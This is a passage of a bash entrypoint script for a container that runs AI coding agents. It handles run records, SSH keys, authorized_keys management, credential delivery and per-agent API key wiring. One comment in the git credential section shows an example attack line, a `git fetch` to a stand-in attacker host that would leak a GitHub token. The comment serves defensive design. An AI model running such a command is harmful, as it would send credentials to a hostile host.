    if ! command -v curl > /dev/null 2>&1 || ! command -v jq > /dev/null 2>&1; then
        runs_note "cannot export: curl or jq is missing from this image; the record is local only"
        return 0
    fi
    payload="$(runs_otlp_payload "${path}" "${AGENT_CONTAINER_EXPORT_TASK:-1}")"
    if [[ -z "${payload}" ]]; then
        runs_note "could not build the OTLP payload for this record; it is local only"
        return 0
    fi
    # Body and status in one call, separated by a sentinel the body cannot
    # contain unescaped. A second request to learn the status would export twice.
    body="$(printf '%s' "${payload}" | curl -sS -m "${OTLP_TIMEOUT}" \
        -X POST "${endpoint}" \
        -H 'Content-Type: application/json' \
        --data-binary @- \
        -w '\n__ACHTTP__%{http_code}' 2>/dev/null)"
    http="${body##*__ACHTTP__}"
    body="${body%$'\n'__ACHTTP__*}"
    case "${http}" in
        ""|000|*[!0-9]*)
            # No response at all: unreachable, DNS failure, timeout. RETRYABLE —
            # the endpoint may simply be back later, which is why this is
            # `failed` and not `rejected`.
            #
            # `000` IS THE UNREACHABLE CASE, and it has to be named explicitly:
            # curl writes 000 to %{http_code} when it never got a status line, and
            # 000 is all digits, so the numeric guard above does NOT catch it. It
            # fell through to the catch-all and was marked `rejected` — TERMINAL,
            # never retried — so a collector that was merely down would have
            # permanently discarded every record written while it was down. Found
            # by pointing the exporter at a closed port and reading the state,
            # which is the only way this surfaces: the export "worked" either way.
            state="failed"
            runs_note "the telemetry endpoint did not answer; this record is local only and marked failed (retryable by 'agent-container telemetry collect')"
            ;;
        2*)
            # THE SUBTRACTION. `partialSuccess.rejectedLogRecords` — absent means
            # zero, and a non-zero count with one record in the request means THIS
            # record was refused.
            rejected="$(printf '%s' "${body}" \
                | jq -r '.partialSuccess.rejectedLogRecords // 0' 2>/dev/null)"
            case "${rejected}" in
                ""|*[!0-9]*) rejected=0 ;;
            esac
            if [[ "${rejected}" -gt 0 ]]; then
                state="rejected"
                runs_note "the telemetry endpoint returned success but REFUSED this record (partialSuccess.rejectedLogRecords=${rejected}); a retry would be refused again"
            else
                state="accepted"
            fi
            ;;
        408|429|5*)
            state="failed"
            runs_note "the telemetry endpoint returned ${http} (transient); this record is marked failed and is retryable"
            ;;
        *)
            # The endpoint understood and refused. It will refuse again unchanged,
            # so this is terminal and a retry would only repeat the refusal.
            state="rejected"
            runs_note "the telemetry endpoint refused this record with ${http}; a retry would be refused again"
            ;;
    esac
    runs_set_export_state "${path}" "${state}" \
        || runs_note "exported with outcome '${state}' but could not record it on the record"
    return 0
}

# Complete the record. $1 is the run's own exit status, or empty when it is not
# yet known (the signal path). Idempotent by construction — see below.
runs_complete() {
    local rc="${1-}" outcome ended exit_code=""
    [[ -n "${RUNS_ID}" ]] || return 0
    # Completed exactly ONCE. The signal path completes the record first — so it
    # is durable inside the runtime's stop grace period — and only then waits for
    # the agent and exits; the EXIT trap that follows must not overwrite
    # `stopped` with the status of a process that was killed.
    [[ "${RUNS_COMPLETED}" -eq 0 ]] || return 0
    RUNS_COMPLETED=1
    # BEFORE the outcome is decided and the record written, because this is the
    # only moment the workspace's end state exists to be read — and it must
    # happen on the crash and signal paths too, not just the clean one. It is
    # wrapped so a git problem cannot stop the record itself from being written:
    # a run with no repository detail is a loss, a run with no record is the
    # failure this whole feature exists to prevent.
    runs_safely runs_repo_capture_exit
    ended="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    if [[ "${RUNS_SIGNALLED}" -eq 1 ]]; then
        # `stopped` is the one outcome legal for BOTH kinds (data-model §2).
        outcome="stopped"
        # exit_code stays null deliberately: the agent had not exited when this
        # record was made durable, and writing 143 would be an invented fact
        # about a process whose status nobody had yet collected.
    elif [[ "${RUNS_KIND}" == "headless" ]]; then
        if [[ "${rc}" == "0" ]]; then outcome="finished"; else outcome="failed"; fi
        exit_code="${rc}"
    else
        # The interactive vocabulary is `ended` | `stopped` and nothing else
        # (FR-003): a session has no completion semantics, so `failed` is not
        # available for an entrypoint that exited badly. The status goes in a
        # note instead of being smuggled into an outcome the vocabulary forbids.
        outcome="ended"
        [[ "${rc}" == "0" ]] || runs_note "the entrypoint exited ${rc} before the session was stopped"
    fi
    runs_emit "${outcome}" "${ended}" "${exit_code}"
}

# EVERY ENTRY INTO THE RECORD MACHINERY GOES THROUGH HERE, AND NONE OF THEM CAN
# FAIL THE RUN.
#
# `set -e` is live at all four call sites — top level, both signal handlers and
# the exit trap — so a non-zero escaping this machinery would end the run: at
# start, BEFORE THE AGENT EVER RAN; in a handler, by replacing the run's own
# status with the status of its bookkeeping. FR-008/C11 forbid both, and the
# first was measured, not imagined: a `return 1` on runs_emit's unwritable-volume
# path killed the entrypoint during startup and every downstream test with it.
#
# The status is dropped HERE, once, rather than by a `|| true` at each site that
# a later edit can forget to add. This is the mirror image of the egress
# entrypoint's shadowed `iptables`: there a failure had to be impossible to
# SWALLOW, here it has to be impossible to PROPAGATE. Same discipline, opposite
# direction — and the reason dropping the status costs no diagnosis is that
# runs_emit reports every failure through runs_note first.
runs_safely() {
    "$@" || log "run record: internal error in ${1} — the run itself is unaffected"
    return 0
}

# EXIT trap, installed only once a record exists.
runs_on_exit() {
    local rc=$?
    # `set +e` as well as runs_safely: the wrapper protects the completion, this
    # protects everything else this handler might ever contain. The status is
    # captured above and restored by the explicit `exit` below, which is the only
    # exit this handler takes.
    set +e
    runs_safely runs_complete "${rc}"
    exit "${rc}"
}

# Early TERM/INT handler, live from the moment the record opens until the
# mode-specific handler replaces it. It exists so that a `down` issued while the
# container is still cloning a large repository — the longest step before either
# mode's own trap is installed — still produces a record rather than a pending
# file the tool has to reconstruct. Deliberately superseded below by
# headless_shutdown (headless) and shutdown (interactive), which additionally
# stop the things those modes started.
runs_signal_stop() {
    RUNS_SIGNALLED=1
    log "shutdown signal received during setup"
    runs_safely runs_complete ""
    exit 143
}

# Open the record: fix the fields that are known at start, write it PENDING
# (ended_at and outcome both null — the pair that identifies a record no exit
# path has completed), and arm the exit paths.
runs_start() {
    if [[ "${AGENT_CONTAINER_MODE}" == "headless" ]]; then
        RUNS_KIND="headless"
        # The same default the headless dispatch applies, so the record can never
        # name a different agent from the one that ran.
        RUNS_AGENT="${AGENT_CONTAINER_AGENT:-claude}"
    else
        RUNS_KIND="interactive"
        RUNS_AGENT="${AGENT_CONTAINER_AGENT}"
    fi
    # No agent is the pre-004 bare-shell layout: nothing is auto-launched, so
    # there is no run to account for — and `agent` is closed to the four
    # supported names, so there is nothing truthful to put in it either. Said out
    # loud rather than skipped quietly, because "no record" must never be
    # something an operator has to infer.
    if [[ -z "${RUNS_AGENT}" ]]; then
        log "NOTE: no agent configured (bare-shell session) — no run record is written for this container"
        return 0
    fi
    RUNS_ID="$(date -u +%Y%m%dT%H%M%SZ)-$(runs_nonce)"
    RUNS_STARTED_AT="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    if [[ "${RUNS_KIND}" == "headless" && -f "${TASK_FILE}" ]]; then
        # `$(cat f)` alone strips trailing newlines; the `printf x` / `%x` pair
        # keeps the task BYTE-IDENTICAL to what the operator passed, which is
        # what quickstart S12 checks. Encoded once, here, so the exit path — the
        # one bounded by the stop grace period — never re-walks a large task.
        local _t
        _t="$(cat "${TASK_FILE}"; printf 'x')"
        RUNS_TASK_JSON="$(json_string "${_t%x}")"
    fi
    runs_safely runs_emit "" "" ""
    trap runs_on_exit EXIT
    trap runs_signal_stop TERM INT
    log "run record ${RUNS_ID} opened (pending) under ${RUNS_DIR}"
}

runs_safely runs_start


# --- 1b. Seed persistent shell-env template ---------------------------------
# /home/dev/.agent-env lives on the per-container 'shellenv' named volume and is
# (Feature 011) named for what it IS — the persistent shell environment — rather
# than sharing a name with the project config directory it has nothing to do with.
# sourced into every interactive bash/zsh shell (see Dockerfile). On first boot
# the volume is empty, so drop a commented template explaining its purpose.
# Idempotent: never overwrite an existing file, and never echo its contents.
# Home base is /home/dev in the image (deliberately hardcoded, not $HOME, since
# the runtime may not export HOME for the non-root user). AGENT_CONTAINER_HOME lets the
# off-container test harness redirect this one path; production leaves it unset
# so the default is byte-identical to the previous behavior.
AGENT_CONTAINER_HOME="${AGENT_CONTAINER_HOME:-/home/dev}"
AGENT_CONTAINER_ENV_FILE="${AGENT_CONTAINER_HOME}/.agent-env/env"
if [[ ! -f "${AGENT_CONTAINER_ENV_FILE}" ]]; then
    log "seeding persistent shell-env template at ${AGENT_CONTAINER_ENV_FILE}"
    mkdir -p "${AGENT_CONTAINER_HOME}/.agent-env"
    cat > "${AGENT_CONTAINER_ENV_FILE}" <<'EOF'
# ~/.agent-env/env — persistent shell environment for this agent-container container.
#
# This file lives on the per-container 'shellenv' named volume, so it survives
# `agent-container down` / `agent-container up` and crashes (it is dropped only by `down --purge`).
# It is sourced with `set -a` into every interactive bash and zsh shell,
# including tmux panes. Keep it to simple KEY=VALUE / export lines.
#
# Example:
#   export FOO=bar
EOF
else
    log "persistent shell-env file already present, leaving it alone"
fi

# --- 2. SSH host key (rootless: dev-owned, on the persisted ~/.ssh volume) ---
# The host key lives in ~/.ssh/hostkeys (a per-container named volume), so a
# container keeps a STABLE identity across down/up while different containers
# differ. Generated as the dev user — no root. ssh-keygen -A cannot target a
# custom dir, so we generate the single ed25519 key explicitly. Idempotent:
# only generate if absent (a persisted or injected key is left untouched).
SSH_DIR="${AGENT_CONTAINER_HOME}/.ssh"
HOSTKEY_DIR="${SSH_DIR}/hostkeys"
HOSTKEY="${HOSTKEY_DIR}/ssh_host_ed25519_key"
mkdir -p "${HOSTKEY_DIR}"
chmod 0700 "${SSH_DIR}" "${HOSTKEY_DIR}"

# The container's host key is created HERE and NEVER LEAVES (Feature 018, FR-001):
# it keeps the persisted one, else generates a fresh ed25519.
#
# Two injection branches used to precede these — a bind-mounted private key from
# `up --host-key`, and SSH_HOST_ED25519_KEY_B64 from the env-file channel. Both are
# removed: they put a plaintext private key on the operator's disk and bought
# nothing, because nothing verified against it. The tool now captures the PUBLIC
# half below and pins it, which is what verification actually needs.
if [[ ! -f "${HOSTKEY}" ]]; then
    log "generating SSH host key (ed25519) at ${HOSTKEY}"
    ssh-keygen -q -t ed25519 -f "${HOSTKEY}" -N ''
else
    log "SSH host key already present, skipping generation"
fi
# Validate the key and (re)derive its public half. A corrupt key fails fast here
# rather than as an opaque sshd startup error — and the .pub is what the tool reads
# back through the runtime to pin (Feature 018), so it is derived on EVERY boot and
# left world-readable deliberately. Nothing secret is in it.
if ! ssh-keygen -y -f "${HOSTKEY}" > "${HOSTKEY}.pub" 2>/dev/null; then
    die "SSH host key at ${HOSTKEY} is missing or invalid"
fi
chmod 0600 "${HOSTKEY}"
chmod 0644 "${HOSTKEY}.pub"

# --- 2b. authorized_keys: union of persisted + injected sources, deduped -----
# Non-secret (public keys). Sources: the persisted file, a bind-mounted file
# (`up --authorized-key`), and the SSH_AUTHORIZED_KEYS env var. Deduped so
# repeated boots and overlapping sources don't accumulate duplicates.
# SHARED-BLOCK BEGIN authorized_keys (drift-guarded; see test_pure_logic)
AUTHKEYS="${SSH_DIR}/authorized_keys"
# This region is REPLACED on every boot. `~/.ssh/config`'s identically-styled
# block is WRITE-ONCE (an agent's own settings must survive) — same idiom,
# OPPOSITE update rule, so both sites say which they are. A region that is never
# rewritten cannot revoke; a block that is rewritten would discard agent settings.
# DETECTED by stable prefix, WRITTEN with the hint. The hint invites editing, so
# if detection required the whole decorated line an operator who reworded it would
# ORPHAN the region: its keys would become outside-content — permanent and
# unrevocable — while a fresh region was appended below. FR-006 failing silently.
AK_BEGIN_ID="# BEGIN agent-container managed keys"
AK_END_ID="# END agent-container managed keys"
AK_BEGIN="${AK_BEGIN_ID} — replaced on every boot; edit outside this region"
AK_END="${AK_END_ID}"
# What the TOOL grants THIS boot. Deliberately NOT unioned with the persisted
# file: a union retains every key ever injected, so removing a key from the
# source could never withdraw access (Feature 020, FR-006). SSH_AUTHORIZED_KEYS
# is supplied per boot, so it belongs INSIDE the region, not outside it.
_akr="$(mktemp)"
[[ -f "${INJECT_DIR}/authorized_keys" ]] && cat "${INJECT_DIR}/authorized_keys" >> "${_akr}"
[[ -n "${SSH_AUTHORIZED_KEYS:-}" ]] && printf '%s\n' "${SSH_AUTHORIZED_KEYS}" >> "${_akr}"
_akb=0
_ake=0
if [[ -f "${AUTHKEYS}" ]]; then
    _akb="$(awk -v b="${AK_BEGIN_ID}" 'index($0, b) == 1 { n++ } END { print n + 0 }' "${AUTHKEYS}")"
    _ake="$(awk -v e="${AK_END_ID}" 'index($0, e) == 1 { n++ } END { print n + 0 }' "${AUTHKEYS}")"
fi
# REFUSE rather than repair: a lone or repeated sentinel means the region's extent
# is unknown, and guessing a boundary risks deleting keys the operator added.
if [[ "${_akb}" != "${_ake}" ]] || [[ "${_akb}" -gt 1 ]]; then
    rm -f "${_akr}"
    die "authorized_keys has a malformed managed region (${_akb} begin, ${_ake} end marker(s)); refusing to rewrite it. Edit ${AUTHKEYS} so the markers form exactly one pair, or delete both marker lines."
fi
if [[ -s "${_akr}" ]] || [[ -f "${AUTHKEYS}" ]]; then
    # Content outside the region is NOT the tool's to remove (FR-016).
    _ako="$(mktemp)"
    if [[ -f "${AUTHKEYS}" ]]; then
        awk -v b="${AK_BEGIN_ID}" -v e="${AK_END_ID}" \
            'index($0, b) == 1 { inside = 1; next } index($0, e) == 1 { inside = 0; next } !inside { print }' \
            "${AUTHKEYS}" > "${_ako}"
    fi
    # A key the operator keeps OUTSIDE the region wins: we drop OUR duplicate, not
    # their line, so a recreate still withdraws what the tool granted while their
    # line survives. Dropping theirs would leave the key authorised after removal
    # and fail FR-006 silently.
    _akf="$(mktemp)"
    {
        cat "${_ako}"
        printf '%s\n' "${AK_BEGIN}"
        # FILENAME, not the usual NR == FNR: that idiom INVERTS when the first
        # file is empty (NR and FNR both restart), and an empty _ako is exactly
        # the fresh-deploy case — every granted key would be classified as
        # already-present and dropped, authorising nobody on first boot.
        awk -v ako="${_ako}" 'FILENAME == ako { if (NF) outside[$0] = 1; next }
             NF && !($0 in outside) && !seen[$0]++ { print }' "${_ako}" "${_akr}"
        printf '%s\n' "${AK_END}"
    } > "${_akf}"
    mv "${_akf}" "${AUTHKEYS}"
    chmod 0600 "${AUTHKEYS}"
    log "authorized_keys managed region rewritten ($(awk 'NF && $0 !~ /^#/' "${AUTHKEYS}" | wc -l | tr -d ' ') key(s) authorized)"
    rm -f "${_ako}"
fi
rm -f "${_akr}"
# SHARED-BLOCK END authorized_keys

# sshd's privilege-separation directory (/run/sshd) is created root-owned at
# build time; a rootless sshd only needs it to exist, not to write to it.

# --- 2b2. sshd — ALWAYS, and BEFORE anything that consumes a credential -------
# sshd is the primary interaction surface with the agent, so it runs in EVERY mode,
# headless included: a headless run is exactly when an operator needs to look inside
# a container they cannot attach to. It used to start in section 4, after the
# credential stages and only in interactive mode.
#
# Placed HERE, immediately after the admit set is written, for two reasons: the
# authorised keys must exist before the door opens, and the delivery channel must be
# listening before section 2c waits for a delivery to arrive through it.
#
# Daemonized (no -D) so the entrypoint continues to the remaining stages. Runs as
# dev (rootless) on unprivileged 2222, host key + pidfile on the dev-owned ~/.ssh
# volume. AGENT_CONTAINER_SSHD lets the test harness substitute a stub.
"${AGENT_CONTAINER_SSHD:-/usr/sbin/sshd}"
log "sshd listening"

# --- 2c. Await out-of-band credential delivery (Constitution IX) -------------
# Secrets are NOT part of the deployment description: the CLI pushes them INTO
# this container after it starts, so nothing secret is written into a file that
# describes the deployment or staged for that description to reference.
#
# The consequence is an ordering obligation here. Everything below that consumes
# a pushed credential must wait for delivery to finish, or it reads a file that
# has not arrived and silently falls back as though nothing was declared.
#
# Gated on the CLI SAYING to expect delivery. Absent variable means no wait at
# all, so every deployment that declares no secrets is byte-for-byte unaffected —
# this must not add a second to the common path.
# Delivered material lands where `dev` can write it: /run/agent-container is the
# runtime's root-owned mount point for compose configs, and delivery arrives as
# dev over SSH with no sudo. /dev/shm is tmpfs — ephemeral, never a volume.
# AGENT_CONTAINER_DELIVER_DIR lets the off-container harness redirect this, the
# same hook AGENT_CONTAINER_INJECT_DIR provides for the compose-config dir.
DELIVER_DIR="${AGENT_CONTAINER_DELIVER_DIR:-/dev/shm/agent-container}"
DELIVERY_SENTINEL="${DELIVER_DIR}/.delivered"
if [[ -n "${AGENT_CONTAINER_AWAIT_DELIVERY:-}" ]]; then
    _dw=0
    _dw_max="${AGENT_CONTAINER_DELIVERY_TIMEOUT:-90}"
    while [[ ! -f "${DELIVERY_SENTINEL}" ]] && ((_dw < _dw_max)); do
        sleep 1
        _dw=$((_dw + 1))
    done
    if [[ -f "${DELIVERY_SENTINEL}" ]]; then
        log "credential delivery complete after ${_dw}s"
    else
        # Continue rather than die. The env/.env channels may still supply what is
        # needed, so refusing to start would break a container that could work;
        # and a container that says exactly what failed to arrive is easier to
        # diagnose than one that never came up. Loud, not fatal.
        log "WARNING: credential delivery did not complete within ${_dw_max}s — continuing WITHOUT the pushed secrets; agents may fall back to env/.env"
    fi
fi

# --- 3. Git identity + credential helper ------------------------------------
# Identity is non-secret; logging the name is fine. Email is also non-secret
# but we still don't echo it — keep the log surface minimal.
git config --global user.name "${GIT_USER_NAME}"
git config --global user.email "${GIT_USER_EMAIL}"
git config --global init.defaultBranch main
git config --global pull.rebase false

# Credential helper as a shell function. Single quotes are CRITICAL: the body
# is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
# shell at git-push time from the process env — not by this script now. The
# token is never written to disk in the container.
#
# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
# autonomous agent tricked into `git fetch https://attacker.example/repo` would
# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
# for github.com; no global helper is set, so other hosts get no credential at all.
git config --global credential.https://github.com.helper \
    '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'

log "Configured git identity for ${GIT_USER_NAME}"

# --- 3a. Canonical agent config (Feature 003, US3) --------------------------
# Operator-canonical agent config is delivered FRESH each boot as ephemeral
# compose configs mirrored under ${INJECT_DIR}/config/<home-relative-path> (e.g.
# .claude/settings.json). Overlay that tree onto the agent home so the canonical
# files (settings.json, CLAUDE.md, config.toml, AGENTS.md, …) are OVERWRITTEN with
# the operator's current copy on every up/redeploy (FR-007), while every OTHER
# file under the home — the agent's mutable runtime state (history, caches, auth)
# — is left untouched and persists on the per-agent volume (FR-008). Idempotent:
# re-running just re-overlays the same files. Runs BEFORE the Claude apiKeyHelper
# patch (3c) so the helper merges into the freshly delivered settings.json rather
# than being clobbered by it, and BEFORE the codex/pi home seeding (3c) so those
# ephemeral homes pick up the fresh canonical config. Canonical config is non-secret
# by definition (FR-007); real secrets travel the ephemeral key-file channel (US2).
CONFIG_INJECT_DIR="${INJECT_DIR}/config"
if [[ -d "${CONFIG_INJECT_DIR}" ]]; then
    # `cp -R "<dir>/."` overlays the CONTENTS (including the dot-named agent homes)
    # onto HOME, creating subdirs as needed and overwriting only the delivered
    # canonical files. Plain -R (NOT -a/-p) so the unprivileged dev user never
    # fails trying to preserve the /run source ownership; the staged files are
    # 0644 (readable).
    if cp -RL "${CONFIG_INJECT_DIR}/." "${AGENT_CONTAINER_HOME}/" 2>/dev/null; then
        log "Delivered operator-canonical agent config fresh (runtime state under the home preserved)"
    else
        log "NOTE: failed to overlay canonical agent config from ${CONFIG_INJECT_DIR}"
    fi
fi

# --- 3b. The agent's own SSH key pair (Feature 019) -------------------------
# GENERATED HERE, AT THE CONVENTIONAL PATH, AND IT NEVER LEAVES. The tool used to
# INJECT a private key (`--push-key`, SSH_PUSH_KEY_B64) — copying a 0644 file to a
# 0600 one under /tmp and pointing git's core.sshCommand at it. All of that is
# gone: a key the container generates is 0600 from birth, and `~/.ssh/id_ed25519`
# is where ssh looks by default, so git, ssh, scp and rsync all use it with NO
# wiring. Only the PUBLIC half ever leaves, captured through the runtime.
#
# It is called the AGENT's key, not a "push key": it is wired to nothing
# push-specific, and the first thing it does is usually clone.
AGENT_KEY="${SSH_DIR}/id_ed25519"
if [[ ! -f "${AGENT_KEY}" ]]; then
    # ONLY when absent. Regenerating on every boot would silently invalidate the
    # operator's registration on the forge while every other symptom looked
    # healthy — surfacing days later as a push that stopped working.
    log "generating the agent SSH key (ed25519) at ${AGENT_KEY}"
    if ! ssh-keygen -q -t ed25519 -f "${AGENT_KEY}" -N '' 2>/dev/null; then
        # LOUD, and fatal. A container that starts, cannot authenticate anywhere,
        # and says nothing is the worst outcome: the agent meets it hours later as
        # an inexplicable permission denied.
        die "could not generate the agent SSH key at ${AGENT_KEY} — the container would start unable to authenticate anywhere"
    fi
else
    log "agent SSH key already present, keeping it (registration stays valid)"
fi
if ! ssh-keygen -y -f "${AGENT_KEY}" > "${AGENT_KEY}.pub" 2>/dev/null; then
    die "the agent SSH key at ${AGENT_KEY} is missing or invalid"
fi
chmod 0600 "${AGENT_KEY}"
chmod 0644 "${AGENT_KEY}.pub"   # the tool reads this back through the runtime

# The operator's known_hosts for outbound remotes goes to the CONVENTIONAL path —
# already on this volume — so the config below can name a default rather than a
# tool-specific location.
if [[ -f "${INJECT_DIR}/known_hosts" ]]; then
    cat "${INJECT_DIR}/known_hosts" >> "${SSH_DIR}/known_hosts"
elif [[ -n "${PUSH_KNOWN_HOSTS:-}" ]]; then
    printf '%s\n' "${PUSH_KNOWN_HOSTS}" >> "${SSH_DIR}/known_hosts"
fi
[[ -f "${SSH_DIR}/known_hosts" ]] || : > "${SSH_DIR}/known_hosts"
chmod 0644 "${SSH_DIR}/known_hosts"

# The tool's ssh_config block — APPENDED IF THE BLOCK IS ABSENT, never rewritten.
# Write-once applies to the BLOCK, not the file: an agent that created ~/.ssh/config
# first (a jump host, a per-host user) must still gain these settings, or
# StrictHostKeyChecking is never set and every SSH it attempts hangs on a prompt it
# cannot answer.
#
# Stated EXPLICITLY rather than leaning on ssh's defaults: the block then documents
# what the agent's identity IS, survives a change in ssh's default search order, and
# IdentitiesOnly stops ssh offering every key it finds — which matters the moment a
# second one exists, because a server's auth-attempt limit can be reached before the
# right key is tried.
SSH_CONFIG="${SSH_DIR}/config"
if ! grep -q '^# BEGIN agent-container' "${SSH_CONFIG}" 2>/dev/null; then
    cat >> "${SSH_CONFIG}" <<EOF
# BEGIN agent-container (managed; appended once, never rewritten)
Host *
    IdentityFile ${AGENT_KEY}
    IdentitiesOnly yes
    UserKnownHostsFile ${SSH_DIR}/known_hosts
    StrictHostKeyChecking accept-new
# END agent-container
EOF
    log "wrote the agent ssh_config block"
fi
chmod 0600 "${SSH_CONFIG}"

# --- 3c. Model/API credentials (Feature 003, US2) ---------------------------
# The TOOL-INJECTED model/API credential is ALWAYS ephemeral (H1, FR-012/SC-004):
# each provider key arrives as a compose config at ${INJECT_DIR}/apikeys/<provider>
# (a /run path that vanishes with the container) and is delivered to each agent
# WITHOUT ever landing on that agent's persistent volume — the deliberate opposite
# of an operator's own INTERACTIVE `login`, whose session persists on the volume and
# is the ONLY on-volume auth. Absent injected keys → the shipped env/.env +
# interactive-login paths still apply (a NOTE, never a die).
# AGENT_CONTAINER_APIKEY_RUNTIME lets the off-container test harness redirect the
# ephemeral home dirs; production leaves it unset so the default is a container-
# private /tmp path (vanishes with the container, never a named volume). Exports
# here reach the tmux server this entrypoint launches below — where the agents run.
APIKEY_INJECT_DIR="${DELIVER_DIR:-/dev/shm/agent-container}/apikeys"
APIKEY_RUNTIME="${AGENT_CONTAINER_APIKEY_RUNTIME:-/tmp/agent-container-apikeys.$(id -u)}"
_anthropic_key="${APIKEY_INJECT_DIR}/anthropic"
_openai_key="${APIKEY_INJECT_DIR}/openai"

# Claude Code — file-first via apiKeyHelper. The helper is a NON-secret command in
# ~/.claude/settings.json that CATS the ephemeral injected key at Claude's request
# time; the key bytes themselves NEVER touch the ~/.claude volume (H1). Self-healing:
# if the key is absent on a later boot the helper emits nothing and Claude falls back
# to ANTHROPIC_API_KEY / interactive login.
if [[ -f "${_anthropic_key}" ]]; then
    CLAUDE_DIR="${AGENT_CONTAINER_HOME}/.claude"
    mkdir -p "${CLAUDE_DIR}"
    _helper="${CLAUDE_DIR}/apikey-helper.sh"
    printf '#!/bin/sh\ncat "%s" 2>/dev/null || true\n' "${_anthropic_key}" > "${_helper}"
    chmod 0755 "${_helper}"
    _settings="${CLAUDE_DIR}/settings.json"
    if [[ -f "${_settings}" ]]; then
        # Merge (preserve the operator's other settings). The US3 canonical copy
        # (section 3a above) has already delivered any fresh settings.json, so this
        # patch merges the apiKeyHelper INTO the operator's current file.
        if command -v jq >/dev/null 2>&1; then
            _tmp="$(mktemp)"
            if jq --arg h "${_helper}" '.apiKeyHelper = $h' "${_settings}" > "${_tmp}" 2>/dev/null; then
                mv "${_tmp}" "${_settings}"
                log "Claude apiKeyHelper merged into ~/.claude/settings.json (ephemeral injected Anthropic key; never on the volume)"
            else
                rm -f "${_tmp}"
                log "NOTE: ~/.claude/settings.json is not valid JSON; leaving it unchanged (apiKeyHelper not wired — use ANTHROPIC_API_KEY or interactive login)"
            fi
        else
            log "NOTE: jq unavailable; cannot merge apiKeyHelper into the existing ~/.claude/settings.json"
        fi
    else
        printf '{\n  "apiKeyHelper": "%s"\n}\n' "${_helper}" > "${_settings}"
        chmod 0600 "${_settings}"
        log "Claude apiKeyHelper wired to the ephemeral injected Anthropic key (never written to the ~/.claude volume)"
    fi
fi

# Codex — redirect CODEX_HOME to an EPHEMERAL dir so an api-key login writes
# auth.json THERE, never onto the -codex volume (H1). Try the non-interactive
# api-key login reading the injected file on STDIN; if that codex build lacks it,
# fall back to OPENAI_API_KEY in the in-container env (003 FR-006 fallback — never on
# argv, never on a volume). CODEX_HOME is only redirected when a key is injected, so
# without one an operator's interactive `codex login` still persists on the volume.
if [[ -f "${_openai_key}" ]]; then
    export CODEX_HOME="${APIKEY_RUNTIME}/codex-home"
    mkdir -p "${CODEX_HOME}"
    chmod 0700 "${CODEX_HOME}"
    # Seed the ephemeral home from the on-volume ~/.codex — its canonical config
    # (config.toml/AGENTS.md, delivered FRESH by section 3a) and prior state — so
    # the redirect does not hide the operator's config (FR-007/SC-005). The
    # injected auth written below stays ONLY in this ephemeral dir (FR-012). (New
    # session state written here is ephemeral in injected-key mode; use interactive
    # stored-auth for persistent codex state.)
    if [[ -d "${AGENT_CONTAINER_HOME}/.codex" ]]; then
        cp -RL "${AGENT_CONTAINER_HOME}/.codex/." "${CODEX_HOME}/" 2>/dev/null || true
    fi
    _codex_ok=0
    if command -v codex >/dev/null 2>&1; then
        if timeout 30 codex login --with-api-key < "${_openai_key}" >/dev/null 2>&1; then
            _codex_ok=1
        fi
    fi
    if [[ "${_codex_ok}" -eq 1 ]]; then
        log "Codex authenticated from the ephemeral injected OpenAI key (CODEX_HOME redirected off the -codex volume)"
    else
        OPENAI_API_KEY="$(cat "${_openai_key}")"
        export OPENAI_API_KEY
        log "Codex: exported OPENAI_API_KEY into the in-container env (ephemeral CODEX_HOME; the -codex volume is never written)"
    fi
fi

# pi-coding-agent — if ANY provider key is injected, redirect PI_CODING_AGENT_DIR
# to an EPHEMERAL dir so nothing pi writes lands on the -pi volume (H1). pi has no
# documented non-interactive file login, so its injected-key delivery is the
# in-container env (exported just below); the -pi volume is never written. Only
# redirected when a key is injected, so interactive `pi login` otherwise persists.
_any_apikey=0
if [[ -d "${APIKEY_INJECT_DIR}" ]]; then
    for _k in "${APIKEY_INJECT_DIR}"/*; do
        [[ -f "${_k}" ]] && { _any_apikey=1; break; }
    done
fi
if [[ "${_any_apikey}" -eq 1 ]]; then
    export PI_CODING_AGENT_DIR="${APIKEY_RUNTIME}/pi-home"
    mkdir -p "${PI_CODING_AGENT_DIR}"
    chmod 0700 "${PI_CODING_AGENT_DIR}"
    # Seed from the on-volume ~/.pi so the redirect keeps the operator's canonical
    # config visible (FR-007/SC-005); anything pi writes here stays ephemeral (FR-012).
    if [[ -d "${AGENT_CONTAINER_HOME}/.pi" ]]; then
        cp -RL "${AGENT_CONTAINER_HOME}/.pi/." "${PI_CODING_AGENT_DIR}/" 2>/dev/null || true
    fi
    log "pi: PI_CODING_AGENT_DIR redirected to an ephemeral dir (the -pi volume is never written)"
fi

# In-container env delivery (003 FR-006 fallback) for agents without a non-interactive
# file-auth path (pi; codex if its api-key login was unavailable; opencode always).
# Read from the ephemeral injected file into the env — never argv, never a volume,
# never baked.
#
# Feature 010 / research R6: opencode needs NO ephemeral-$HOME redirect. codex and
# pi are redirected purely to keep an injected key out of their on-volume auth
# store; opencode reads ANTHROPIC_API_KEY / OPENAI_API_KEY straight from the env
# and — VERIFIED by running it — never writes an env-supplied key to
# ~/.local/share/opencode/auth.json. So env delivery alone is STRICTLY LESS
# exposure here, not more. Do not add a redirect for symmetry. The on-volume
# auth.json stays operator-interactive-login only, as for the other three.
# Do NOT clobber a value the operator already set via .env (that layer wins).
if [[ -f "${_anthropic_key}" && -z "${ANTHROPIC_API_KEY:-}" ]]; then
    ANTHROPIC_API_KEY="$(cat "${_anthropic_key}")"
    export ANTHROPIC_API_KEY
fi
if [[ -f "${_openai_key}" && -z "${OPENAI_API_KEY:-}" ]]; then
    OPENAI_API_KEY="$(cat "${_openai_key}")"
    export OPENAI_API_KEY
fi

# --- 3d. Clone-on-start (Feature 004, US4) ----------------------------------
# Populate /workspace from a source repo on first start (persistent/ephemeral).
# The credential is chosen by URL SCHEME: https:// uses the github.com GH_TOKEN
# helper (section 3); git@…/ssh:// uses the agent's own key (section 3b).
#
# THE SSH CASE IS TWO-PHASE (Feature 019, FR-013). The key is generated HERE, so on
# a first boot it cannot yet be registered on the forge and the clone cannot
# succeed. Rather than dying — which would make the container unusable and destroy
# the key on the retry — the boot completes and marks the clone PENDING. The
# operator registers the public key and runs `redeploy`. Idempotent: skip
